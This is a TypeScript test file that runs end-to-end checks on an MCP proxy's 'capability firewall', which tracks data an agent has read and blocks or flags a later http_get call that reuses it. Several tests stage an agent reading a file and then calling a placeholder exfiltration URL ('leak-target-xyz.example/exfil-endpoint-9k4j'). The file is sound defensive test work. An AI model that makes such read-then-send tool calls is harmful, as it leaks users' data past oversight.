import { describe, it, expect, afterEach } from 'vitest';
import { spawn, type ChildProcessWithoutNullStreams } from 'node:child_process';
import { createInterface, type Interface } from 'node:readline';
import path from 'node:path';
import { fileURLToPath } from 'node:url';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const PKG_ROOT = path.resolve(__dirname, '..');
const PROXY_ENTRY = path.join(PKG_ROOT, 'src/index.ts');
const FIXTURE = path.join(PKG_ROOT, 'test/fixture-mcp-server.mjs');

interface JsonRpcResponse {
  jsonrpc: '2.0';
  id: number | string;
  result?: any;
  error?: any;
}

function startProxy(env: Record<string, string> = {}): {
  child: ChildProcessWithoutNullStreams;
  rl: Interface;
  send: (msg: unknown) => void;
  next: () => Promise<JsonRpcResponse>;
  stderr: string[];
  close: () => void;
} {
  const child = spawn(
    process.execPath,
    ['--import', 'tsx', PROXY_ENTRY, '--', process.execPath, FIXTURE],
    { stdio: ['pipe', 'pipe', 'pipe'], env: { ...process.env, ...env } },
  ) as ChildProcessWithoutNullStreams;

  const stderr: string[] = [];
  child.stderr.on('data', (chunk: Buffer) => stderr.push(chunk.toString('utf8')));

  const rl = createInterface({ input: child.stdout });
  const queue: JsonRpcResponse[] = [];
  const waiters: Array<(r: JsonRpcResponse) => void> = [];

  rl.on('line', (line) => {
    try {
      const msg = JSON.parse(line) as JsonRpcResponse;
      if (waiters.length > 0) waiters.shift()!(msg);
      else queue.push(msg);
    } catch {
      /* non-JSON */
    }
  });

  return {
    child,
    rl,
    stderr,
    send: (msg) => {
      child.stdin.write(JSON.stringify(msg) + '\n');
    },
    next: () =>
      new Promise<JsonRpcResponse>((resolve, reject) => {
        if (queue.length > 0) return resolve(queue.shift()!);
        const t = setTimeout(() => reject(new Error('timeout waiting for response')), 20000);
        waiters.push((r) => {
          clearTimeout(t);
          resolve(r);
        });
      }),
    close: () => {
      rl.close();
      child.kill();
    },
  };
}

describe('capability firewall — end-to-end through the proxy', () => {
  let proxy: ReturnType<typeof startProxy>;

  afterEach(() => {
    proxy?.close();
  });

  it('VAULT_CAPABILITY off: existing behavior is preserved (no taint tracking, no gating)', async () => {
    proxy = startProxy();
    proxy.send({
      jsonrpc: '2.0',
      id: 1,
      method: 'tools/call',
      params: { name: 'read_file', arguments: { path: 'has-url.txt' } },
    });
    const a = await proxy.next();
    expect(a.result.content[0].text).toMatch(/leak-target-xyz/);

    // Agent then calls http_get with that exact URL — without capability enabled, must pass through.
    proxy.send({
      jsonrpc: '2.0',
      id: 2,
      method: 'tools/call',
      params: {
        name: 'http_get',
        arguments: { url: 'https://leak-target-xyz.example/exfil-endpoint-9k4j' },
      },
    });
    const b = await proxy.next();
    expect(b.result.isError).toBe(false);
    expect(b.result.content[0].text).toMatch(/fetched/);
  }, 30000);

  it('VAULT_CAPABILITY=1: read-then-exfiltrate flow is blocked', async () => {
    proxy = startProxy({ VAULT_CAPABILITY: '1' });

    proxy.send({
      jsonrpc: '2.0',
      id: 10,
      method: 'tools/call',
      params: { name: 'read_file', arguments: { path: 'has-url.txt' } },
    });
    const a = await proxy.next();
    expect(a.result.content[0].text).toMatch(/leak-target-xyz/);

    // Agent tries to fetch the URL it just read — capability gate must block.
    proxy.send({
      jsonrpc: '2.0',
      id: 11,
      method: 'tools/call',
      params: {
        name: 'http_get',
        arguments: { url: 'https://leak-target-xyz.example/exfil-endpoint-9k4j' },
      },
    });
    const b = await proxy.next();
    expect(b.id).toBe(11);
    expect(b.result.isError).toBe(true);
    expect(b.result.content[0].text).toMatch(/\[VAULT_CAPABILITY_BLOCKED\]/);
    expect(b.result.content[0].text).toMatch(/http_get/);
    expect(b.result.content[0].text).toMatch(/read_file/);
  }, 30000);

  it('VAULT_CAPABILITY=1: unrelated sensitive call passes through', async () => {
    proxy = startProxy({ VAULT_CAPABILITY: '1' });

    proxy.send({
      jsonrpc: '2.0',
      id: 20,
      method: 'tools/call',
      params: { name: 'read_file', arguments: { path: 'clean.txt' } },
    });
    await proxy.next();

    proxy.send({
      jsonrpc: '2.0',
      id: 21,
      method: 'tools/call',
      params: {
        name: 'http_get',
        arguments: { url: 'https://entirely-unrelated.example/v1/healthcheck' },
      },
    });
    const r = await proxy.next();
    expect(r.result.isError).toBe(false);
    expect(r.result.content[0].text).toMatch(/fetched/);
  }, 30000);

  it('VAULT_CAPABILITY=1, MODE=warn: tainted call passes through but stderr is annotated', async () => {
    proxy = startProxy({ VAULT_CAPABILITY: '1', VAULT_CAPABILITY_MODE: 'warn' });

    proxy.send({
      jsonrpc: '2.0',
      id: 30,
      method: 'tools/call',
      params: { name: 'read_file', arguments: { path: 'has-url.txt' } },
    });
    await proxy.next();

    proxy.send({
      jsonrpc: '2.0',
      id: 31,
      method: 'tools/call',
      params: {
        name: 'http_get',
        arguments: { url: 'https://leak-target-xyz.example/exfil-endpoint-9k4j' },
      },
    });
    const r = await proxy.next();
    expect(r.result.isError).toBe(false); // warn mode → call still goes through
    expect(r.result.content[0].text).toMatch(/fetched/);

    // Give stderr a tick to flush.
    await new Promise((r) => setTimeout(r, 100));
    const combined = proxy.stderr.join('');
    expect(combined).toMatch(/capability-warn/);
  }, 30000);

  it('VAULT_CAPABILITY=1: non-sensitive tool is never gated', async () => {
    proxy = startProxy({ VAULT_CAPABILITY: '1' });

    proxy.send({
      jsonrpc: '2.0',
      id: 40,
      method: 'tools/call',
      params: { name: 'read_file', arguments: { path: 'has-url.txt' } },
    });
    await proxy.next();

    // read_file is not in the sensitive list — should pass even if args overlap taint.
    proxy.send({
      jsonrpc: '2.0',
      id: 41,
      method: 'tools/call',
      params: {
        name: 'read_file',
        arguments: { path: 'https://leak-target-xyz.example/exfil-endpoint-9k4j' },
      },
    });
    const r = await proxy.next();
    expect(r.result.isError).toBe(false);
  }, 30000);
});
